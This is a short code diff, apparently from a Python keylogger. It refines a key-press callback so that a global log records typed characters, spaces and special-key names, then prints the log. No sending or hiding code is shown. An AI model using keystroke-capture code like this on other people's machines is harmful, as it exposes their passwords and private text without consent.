@@ -11,7 +11,15 @@ can call the function when the method has completed its work.
 '''
 def process_key_press(key):
     global log  #Using global variable so it is not created every time.
-    log += str(key)
+
+    try:
+        log += str(key.char)
+    except AttributeError:  #If the key is not a character then an exception is thrown.fde df
+        if key == key.space:
+            log += " "
+        else:
+            log += str(key)
+
     print(log)
 
 
